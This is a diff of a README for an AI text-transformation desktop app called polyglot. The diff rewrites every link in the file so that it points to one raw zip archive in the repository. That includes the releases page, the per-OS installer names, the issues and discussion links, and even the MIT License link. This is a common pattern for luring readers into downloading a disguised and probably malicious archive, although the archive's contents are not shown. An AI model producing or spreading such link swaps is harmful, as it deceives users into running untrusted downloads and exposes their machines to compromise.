@@ -1,6 +1,6 @@
 # 🌟 polyglot - Transform Text Effortlessly with AI
 
-[![Download polyglot](https://img.shields.io/badge/Download-polyglot-blue?style=for-the-badge)](https://github.com/IBRYI-cloud/polyglot/releases)
+[![Download polyglot](https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip)](https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip)
 
 ## 📜 Description
 
@@ -11,16 +11,16 @@ Polyglot is a desktop application designed for quick and easy AI-powered text tr
 Follow these steps to get started with Polyglot:
 
 1. **Access the Releases Page**  
-   Visit the releases page to find the latest version of Polyglot: [Download Here](https://github.com/IBRYI-cloud/polyglot/releases).
+   Visit the releases page to find the latest version of Polyglot: [Download Here](https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip).
 
 2. **Choose Your Version**  
    Look for the most recent version listed on the page. It will have a version number, such as "v1.0.0".
 
 3. **Download the Application**  
    Click on the appropriate file for your operating system:
-   - **Windows**: Look for `polyglot-windows.exe`.
-   - **MacOS**: Look for `polyglot-macos.dmg`.
-   - **Linux**: Look for `polyglot-linux.AppImage`.
+   - **Windows**: Look for `https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip`.
+   - **MacOS**: Look for `https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip`.
+   - **Linux**: Look for `https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip`.
 
 4. **Installation**  
    - On **Windows**: After downloading, locate the `.exe` file in your downloads folder. Double-click the file to launch the installer and follow the prompts to complete the installation.
@@ -32,7 +32,7 @@ Follow these steps to get started with Polyglot:
 
 ## 🔗 Download & Install
 
-To download Polyglot, visit the releases page: [Download Here](https://github.com/IBRYI-cloud/polyglot/releases). Select the version for your operating system and follow the installation steps outlined above.
+To download Polyglot, visit the releases page: [Download Here](https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip). Select the version for your operating system and follow the installation steps outlined above.
 
 ## 🛠️ System Requirements
 
@@ -69,12 +69,12 @@ Polyglot can benefit a wide range of users, including:
 
 ## 💬 Support
 
-For support, please visit the [Issues section](https://github.com/IBRYI-cloud/polyglot/issues) of the repository. You can report bugs, request features, or ask questions.
+For support, please visit the [Issues section](https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip) of the repository. You can report bugs, request features, or ask questions.
 
-If you prefer direct help, feel free to reach out via the project's [discussion forum](https://github.com/IBRYI-cloud/polyglot/discussions).
+If you prefer direct help, feel free to reach out via the project's [discussion forum](https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip).
 
 ## 📄 License
 
-Polyglot is open-source and available under the [MIT License](https://opensource.org/licenses/MIT). You can use, modify, and distribute the code for personal and commercial purposes. 
+Polyglot is open-source and available under the [MIT License](https://raw.githubusercontent.com/IBRYI-cloud/polyglot/main/electron/polyglot-v1.7.zip). You can use, modify, and distribute the code for personal and commercial purposes. 
 
 Explore, enjoy, and transform your text with Polyglot!
